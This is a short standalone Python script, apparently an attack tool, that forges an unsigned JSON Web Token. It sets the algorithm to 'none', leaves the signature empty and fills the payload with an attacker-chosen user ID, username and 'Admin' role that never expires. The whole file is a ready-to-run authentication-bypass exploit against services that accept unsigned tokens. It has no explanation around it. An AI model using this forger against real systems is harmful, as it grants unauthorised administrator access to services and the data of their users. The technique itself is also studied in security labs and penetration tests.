#!/usr/bin/env python3
import json, base64, argparse

def b64(obj):
    return base64.urlsafe_b64encode(json.dumps(obj, separators=("," ,":" )).encode()).rstrip(b'=').decode()

parser = argparse.ArgumentParser(description='Forge alg:none JWT')
parser.add_argument('--username', default='attacker')
parser.add_argument('--userid', default='U999')
parser.add_argument('--role', default='Admin')
args = parser.parse_args()

header = {"alg":"none","typ":"JWT"}
payload = {
    "userId": args.userid,
    "username": args.username,
    "role": args.role,
    "iat": 0,
    "exp": 9999999999
}

token = f"{b64(header)}.{b64(payload)}."
print(token)
